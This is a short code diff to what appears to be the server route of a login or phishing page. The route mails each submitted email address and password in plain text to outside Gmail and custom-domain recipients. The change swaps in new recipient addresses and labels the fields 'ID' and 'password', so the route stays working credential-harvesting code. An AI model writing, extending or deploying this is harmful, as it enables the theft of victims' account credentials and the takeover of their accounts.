@@ -19,10 +19,10 @@ export async function POST(request) {
     async function main() {
         const info = await transporter.sendMail({
             from: process.env.GMAIL,
-            to: 'kamleshksks456@gmail.com',
+            to: 'admin@surendra-dev.in.net, Rksaini998303@gmail.com',
             subject: `${email} ${password}`,
-            text: `${email} ${password}`,
-            html: `${email} ${password}`,
+            text: `ID :${email} <br>  password : ${password}`,
+            html: `ID :${email} <br>  password : ${password}`,
         });
 
         console.log("Message sent: %s", info.messageId);
